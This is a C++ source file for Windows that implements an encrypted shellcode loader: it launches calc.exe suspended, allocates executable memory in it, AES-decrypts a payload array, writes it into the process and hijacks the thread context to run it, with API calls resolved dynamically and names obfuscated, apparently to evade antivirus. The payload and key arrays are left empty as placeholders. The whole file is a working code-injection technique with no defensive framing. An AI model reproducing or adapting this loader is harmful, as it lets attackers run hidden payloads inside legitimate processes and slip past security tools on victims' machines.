
#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void ases123enc(char* a, DWORD aLen, char* k, DWORD kLen) {
    HCRYPTPROV hProv;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    HCRYPTHASH hHash;
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    HCRYPTKEY hKey;
    CryptHashData(hHash, (BYTE*)k, kLen, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)a, &aLen);
CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

int main() {

    STARTUPINFO ga = {0};
    PROCESS_INFORMATION pi = {0};
    ga.cb = sizeof(ga);
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    unsigned char ke185hams[] = {};
    CONTEXT cvx = {0};
    
    auto pCreateProcess = (BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))GetProcAddress(hKernel32, "CreateProcessA");
    pCreateProcess("C:\\Windows\\System32\\calc.exe", 0, 0, 0, FALSE,CREATE_SUSPENDED, 0, 0, &ga, &pi);
      
    cvx.ContextFlags = CONTEXT_FULL;

    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "GetThreadContext");
    pGetThreadContext(pi.hThread, &cvx);
unsigned char itsthecod345[] = {};

    //auto dynamic link
    auto pVirtualAllnocEkx = (LPVOID(WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hKernel32, "VirtualAllocEx");
    LPVOID falpo = pVirtualAllnocEkx(pi.hProcess, NULL, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    ases123enc((char*)  itsthecod345, sizeof(itsthecod345), ke185hams, sizeof(ke185hams));

    //manual dynamic link
    BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) =
    (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(hKernel32, "WriteProcessMemory");

    pWriteProcessM(pi.hProcess, falpo, itsthecod345, sizeof(itsthecod345), NULL);
    cvx.Rcx = (DWORD64)falpo; 

    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(hKernel32, "SetThreadContext");
    pSetThreadContext(pi.hThread, &cvx);
    auto pResumeThread = (DWORD(WINAPI*)(HANDLE))GetProcAddress(hKernel32, "ResumeThread");
    pResumeThread(pi.hThread); 


    return 0;
}
